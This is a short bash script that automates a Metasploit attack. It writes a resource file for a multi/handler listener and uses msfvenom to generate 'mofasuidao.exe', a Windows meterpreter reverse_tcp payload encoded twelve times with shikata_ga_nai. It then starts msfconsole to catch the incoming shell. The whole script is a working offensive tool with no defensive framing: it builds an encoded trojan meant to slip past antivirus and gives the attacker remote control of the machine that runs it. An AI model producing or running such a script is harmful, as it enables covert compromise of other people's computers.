#!/bin/bash
lhost=`ifconfig $1 | sed 's/  /\n/g' | grep -i 'inet ' | awk '{print $2}'`
lport=4444
fileName=mofasuidao.exe
echo use exploit/multi/handler > msfvenom.msf
echo set payload windows/meterpreter/reverse_tcp >> msfvenom.msf
echo set lhost $lhost >> msfvenom.msf
echo set lport 4444 >> msfvenom.msf
echo run >>msfvenom.msf

if [ ! -f "./$fileName" ];then
    msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 12 -b '\x00' lhost=$lhost lport=$lport -f exe > $fileName
fi
service postgresql start
msfconsole -r msfvenom.msf

